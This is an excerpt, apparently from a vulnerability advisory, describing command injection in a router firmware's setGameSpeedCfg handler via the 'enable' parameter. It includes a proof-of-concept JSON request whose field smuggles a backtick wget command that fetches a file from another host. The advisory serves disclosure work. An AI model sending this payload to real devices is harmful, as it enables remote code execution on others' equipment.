...
In sub_42B17C function, it reads in a user-provided parameter `enable` and passes its value to Uci_Set_Str function,which is defined in libcscommon.so.
...
{"topicurl":"setGameSpeedCfg","enable":"`wget 192.168.6.1:7777/testpoc`"
}
```
